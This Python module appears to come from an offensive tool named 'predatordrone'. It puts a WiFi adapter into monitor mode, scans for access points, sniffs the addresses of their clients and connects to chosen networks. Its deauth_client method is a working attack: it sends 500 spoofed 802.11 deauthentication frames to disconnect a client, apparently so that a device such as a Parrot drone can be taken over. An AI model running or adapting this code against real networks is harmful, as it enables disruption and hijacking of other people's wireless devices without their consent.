#! /usr/bin/env python3
#
# Wifi management
#

from predatordrone.external_exec import do
import predatordrone.disp as disp
from scapy.all import *



# ===============
#    Constants
# ===============

ip_prog   = "ip"
iw_prog   = "iw"
ifconfig  = "ifconfig"
iwconfig  = "iwconfig"
airmon    = "airmon-ng"
aireplay  = "aireplay-ng"
dhclient  = "dhclient"




# ============================================
#    Access point and client representation
# ============================================

class AccessPoint:
    def __init__(self, ssid, bssid, channel, crypto):
        self.ssid   = ssid
        self.bssid  = bssid
        self.chan   = channel
        self.crypto = crypto

    def __str__(self):
        return "AP " + self.bssid \
            + " with SSID " + self.ssid \
            + " on channel " + str(self.chan) \
            + " (" + ' / '.join(self.crypto) + ")"

    def short_str(self):
        return self.ssid + " (" + self.bssid + ")"

    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.__dict__ == other.__dict__



class Client:
    def __init__(self, mac, ip):
        self.mac = mac
        self.ip  = ip

    def __str__(self):
        return self.ip + " with MAC " + self.mac

    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.__dict__ == other.__dict__




# ============================
#    WiFi device management
# ============================

class WifiManager:
    WIFI_CHAN_MIN = 1
    WIFI_CHAN_MAX = 13


    def __init__(self, interface, physical_interface):
        self.iface = interface
        self.phy   = physical_interface

        self.detected_aps = []
        self.parrot_aps   = []



    # ============================
    #    Device mode management
    # ============================

    def __set_mode_managed(self):
        disp.debug("Switching adapter to managed mode")
        do(ip_prog, "link set", self.iface, "down")
        do(iw_prog, self.iface, "del")

        self.iface = self.iface.replace("mon", "")
        do(iw_prog, self.phy, "interface add", self.iface, "type managed")
        do(ip_prog, "link set", self.iface, "up")


    def __set_mode_monitor(self):
        disp.debug("Switching adapter to monitor mode")
        do(ip_prog, "link set", self.iface, "down")
        do(iw_prog, self.iface, "del")

        self.iface = self.iface + "mon"
        do(iw_prog, self.phy, "interface add", self.iface, "type monitor")
        do(ip_prog, "link set", self.iface, "up")



    # ==========================
    #    Access point listing
    # ==========================

    def __f_beacon_probe_resp(self, p):
        """ Filter WiFi beacon and probe response packets. """
        return p.haslayer(Dot11Beacon)


    def __add_access_point(self, p):
        """ Register an access point. """
        netstats = p[Dot11Beacon].network_stats()

        # Get AP details
        bssid    = p.addr3
        ssid     = netstats['ssid']
        channel  = netstats['channel']
        crypto   = netstats['crypto']

        # Build AccessPoint object
        ap = AccessPoint(ssid, bssid, channel, crypto)

        # Save discovered AP
        if ap not in self.detected_aps:
            self.detected_aps.append(ap)
            disp.item1(ap)


    def refresh_aps_list(self):
        """ Refresh APs list. """
        self.__set_mode_monitor()

        disp.info("Searching for new running APs")
        for chan in range(self.WIFI_CHAN_MIN, self.WIFI_CHAN_MAX + 1):
            do(iw_prog, "dev", self.iface, "set channel", str(chan))
            sniff(iface=self.iface, timeout=0.1, lfilter=self.__f_beacon_probe_resp,
                    prn=self.__add_access_point)

        self.__set_mode_managed()


    def show_detected_aps(self):
        """ Show detected access points. """
        print("Found APs:")
        if len(self.detected_aps) == 0:
            disp.item0(disp.red("No AP found!"))
        else:
            for ap in self.detected_aps: disp.item0(ap)


    def clear_aps_list(self):
        """ Clears APs list. """
        self.detected_aps = []



    # =====================
    #    Clients listing
    # =====================

    def __f_bssid_clients(self, bssid, p):
        """ Filter wifi clients of a specific BSSID. """
        return ( ( p.haslayer(Dot11) or p.haslayer(Dot11FCS) )
                and p.addr3 == bssid and p.haslayer(IP) )


    def __add_ssid_client(self, reg_client, p):
        """ Register client of a specific BSSID. """
        # Extract informations
        mac_dst = p.addr1
        mac_src = p.addr2
        bssid   = p.addr3

        ip_dst = p[IP].dst
        ip_src = p[IP].src

        mac = mac_src   if mac_src != bssid     else mac_dst
        ip  = ip_src    if mac_src != bssid     else ip_dst

        # Register client
        reg_client( Client(mac, ip) )


    def search_clients(self, ap, reg_client):
        """
        Search for new clients.
        
        : param ap          The access point for which search clients
        : param reg_client  A callback called when a client is found
        """
        self.__set_mode_monitor()
        do("iw dev", self.iface, "set channel", str(ap.chan))
        sniff(iface=self.iface,
                lfilter=lambda p: self.__f_bssid_clients(ap.bssid,   p),
                prn    =lambda p: self.__add_ssid_client(reg_client, p),
                timeout=1)
        self.__set_mode_managed()



    # =======================
    #    Client management
    # =======================

    def deauth_client(self, client, ap):
        # Build deauth packets: addr1=dst, addr2=src, addr3=bssid
        deauth_pkt = RadioTap() \
                / Dot11(addr1=ap.bssid, addr2=client.mac, addr3=ap.bssid) \
                / Dot11Deauth(reason=7)

        # Send packets
        self.__set_mode_monitor()
        do("iw dev", self.iface, "set channel", str(ap.chan))
        sendp(deauth_pkt, iface=self.iface, count=500, verbose=disp.Verb.isdebug())
        self.__set_mode_managed()


    def connect_access_point(self, ap):
        do("while [ \"$(", iw_prog, self.iface, "link)\" = \"Not connected.\" ]; do",
                iw_prog, self.iface, "connect", ap.ssid, "; sleep 0.1; done")


    def acquire_ip(self):
        do(dhclient, "-r")
        do(dhclient, "-v", self.iface)
